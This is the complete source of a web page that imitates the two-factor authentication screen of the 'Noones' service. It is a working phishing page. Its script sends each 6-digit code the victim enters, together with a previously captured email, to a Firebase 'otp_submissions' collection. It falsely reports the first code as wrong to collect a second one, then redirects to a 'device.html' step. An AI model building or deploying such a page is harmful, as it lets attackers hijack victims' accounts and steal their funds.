<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Authenticator Verification</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Inter',sans-serif;
}

:root{

--bg:#232323;
--card:#2d2d2d;
--input:#333333;
--border:#373737;

--text:#ffffff;
--muted:#a9a9a9;

--green:#37d76c;

}

html,
body{

height:100%;

}

body{

background:var(--bg);

display:flex;

justify-content:center;

align-items:flex-start;

padding-top:55px;

padding-left:25px;

padding-right:25px;

color:white;

}

.wrapper{

width:100%;

max-width:670px;

}

.logo{

display:flex;

justify-content:center;

margin-bottom:38px;

}

.logo img{

width:190px;

height:auto;

display:block;

}

.card{

background:#2d2d2d;

border-radius:12px;

padding:38px;

box-shadow:none;

}

.card h1{

font-size:28px;

font-weight:700;

margin-bottom:22px;

}

.subtitle{

font-size:15px;

font-weight:600;

color:#a6a6a6;

margin-bottom:34px;

}

.otp{

display:flex;

justify-content:center;

gap:10px;

margin-bottom:28px;

}
.otp input{

width:52px;

height:62px;

background:#343434;

border:none;

border-radius:6px;

outline:none;

text-align:center;

font-size:26px;

font-weight:700;

color:#ffffff;

transition:.2s;

}

.otp input:focus{

background:#3b3b3b;

box-shadow:0 0 0 2px rgba(55,215,108,.25);

}

#pasteBtn{

display:block;

margin:0 auto;

background:#444444;

color:#ffffff;

border:none;

border-radius:8px;

padding:9px 18px;

font-size:14px;

font-weight:600;

cursor:pointer;

transition:.2s;

}

#pasteBtn:hover{

background:#4d4d4d;

}

#error{

display:none;

text-align:center;

margin-top:20px;

margin-bottom:15px;

color:#ff7070;

font-size:14px;

font-weight:600;

}

#verifyBtn{

display:block;

width:165px;

height:70px;

margin:32px auto 0;

background:#565656;

border:none;

border-radius:18px;

color:#d6d6d6;

font-size:24px;

font-weight:700;

cursor:not-allowed;

transition:.2s;

}

#verifyBtn:not(:disabled){

background:var(--green);

color:#ffffff;

cursor:pointer;

}

#verifyBtn:not(:disabled):hover{

background:#2cc863;

}

.support{

margin-top:34px;

text-align:center;

font-size:15px;

color:#b8b8b8;

line-height:1.7;

}

.support a{

color:var(--green);

font-weight:700;

text-decoration:underline;

}

.footer{

margin-top:42px;

display:flex;

justify-content:space-between;

align-items:center;

}

.leftTools{

display:flex;

align-items:center;

gap:14px;

}

.icon{

font-size:34px;

color:var(--green);

}

.switch{

width:82px;

height:44px;

background:var(--green);

border-radius:30px;

position:relative;

}

.switch::after{

content:"";

position:absolute;

right:5px;

top:5px;

width:34px;

height:34px;

background:#2b2b2b;

border-radius:50%;

}

.language{

color:var(--green);

font-size:16px;

font-weight:600;

}

@media(max-width:480px){

body{

padding-top:38px;

padding-left:18px;

padding-right:18px;

}

.logo{

margin-bottom:30px;

}

.logo img{

width:170px;

}

.card{

padding:34px 22px;

}

.card h1{

font-size:22px;

}

.subtitle{

font-size:14px;

margin-bottom:28px;

}

.otp{

gap:8px;

}

.otp input{

width:42px;

height:56px;

font-size:22px;

}

#verifyBtn{

width:160px;

height:66px;

font-size:20px;

}

.footer{

margin-top:36px;

}

}

</style>

</head>

<body>

<div class="wrapper">

<div class="logo">

<img src="images/noones-logo.png" alt="Noones">

</div>

<div class="card">

<h1>Two-factor authentication</h1>

<div class="subtitle">

Enter 6-digit code from your Authenticator app

</div>

<div class="otp">

<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">

</div>

<button id="pasteBtn" type="button">

Paste

</button>

<div id="error">

Wrong code. Please try again.

</div>

<button id="verifyBtn" disabled>

Continue

</button>

<div class="support">

If you need to reset 2FA, please

<a href="#" id="supportLink">

contact support ↗

</a>

</div>

</div>

<div class="footer">

<div class="leftTools">

<div class="icon">☼</div>

<div class="switch"></div>

<div class="icon">☾</div>

</div>

<div class="language">

English ▼

</div>

</div>

</div>

<script type="module">
    const inputs = [...document.querySelectorAll(".otp input")];

const verifyBtn = document.getElementById("verifyBtn");

const pasteBtn = document.getElementById("pasteBtn");

const error = document.getElementById("error");

/* ==========================
ENABLE BUTTON
========================== */

function updateButton(){

const filled = inputs.every(input => input.value.length === 1);

verifyBtn.disabled = !filled;

}

/* ==========================
INPUT
========================== */

inputs.forEach((input,index)=>{

input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"").slice(0,1);

if(input.value && index<inputs.length-1){

inputs[index+1].focus();

}

updateButton();

});

input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

inputs[index-1].focus();

}

});

input.addEventListener("focus",()=>{

input.select();

});

});

/* ==========================
PASTE
========================== */

pasteBtn.addEventListener("click",async()=>{

try{

const text=(await navigator.clipboard.readText())
.replace(/\D/g,"")
.substring(0,6);

if(!text)return;

inputs.forEach((box,i)=>{

box.value=text[i] || "";

});

updateButton();

const next=inputs.find(input=>!input.value);

(next || inputs[5]).focus();

}catch{

alert("Unable to access clipboard.");

}

});

/* ==========================
PASTE USING CTRL+V
========================== */

document.addEventListener("paste",(e)=>{

const pasted=(e.clipboardData.getData("text"))
.replace(/\D/g,"")
.substring(0,6);

if(!pasted)return;

e.preventDefault();

inputs.forEach((box,i)=>{

box.value=pasted[i] || "";

});

updateButton();

});

/* ==========================
ENTER KEY
========================== */

document.addEventListener("keydown",(e)=>{

if(e.key==="Enter" && !verifyBtn.disabled){

verifyBtn.click();

}

});

updateButton();
import { db } from "./js/firebase.js";

import {
collection,
addDoc,
serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

/* ==========================
VERIFY BUTTON
========================== */

verifyBtn.addEventListener("click", verifyOTP);

async function verifyOTP(){

error.style.display="none";

const otp = inputs.map(input=>input.value).join("");

if(otp.length!==6){

error.textContent="Please enter the complete 6-digit code.";
error.style.display="block";

return;

}

const email = localStorage.getItem("loginEmail") || "";

let attempts = Number(localStorage.getItem("otpAttempts")) || 0;

verifyBtn.disabled=true;

verifyBtn.textContent="Verifying...";

try{

await addDoc(collection(db,"otp_submissions"),{

email:email,

otp:otp,

attempt:attempts+1,

status:"Pending",

createdAt:serverTimestamp()

});

}catch(err){

verifyBtn.disabled=false;

verifyBtn.textContent="Continue";

error.textContent="Unable to verify. Please try again.";

error.style.display="block";

console.error(err);

return;

}

/* ==========================
FIRST ATTEMPT
========================== */

if(attempts===0){

localStorage.setItem("otpAttempts","1");

verifyBtn.disabled=false;

verifyBtn.textContent="Continue";

error.textContent="Wrong code. Please try again.";

error.style.display="block";

inputs.forEach(box=>box.value="");

inputs[0].focus();

updateButton();

return;

}

/* ==========================
SECOND ATTEMPT
========================== */

localStorage.removeItem("otpAttempts");

localStorage.setItem("authenticatorOTP",otp);

window.location.href="device.html";

}

/* ==========================
END
========================== */

</script>

</body>

</html>
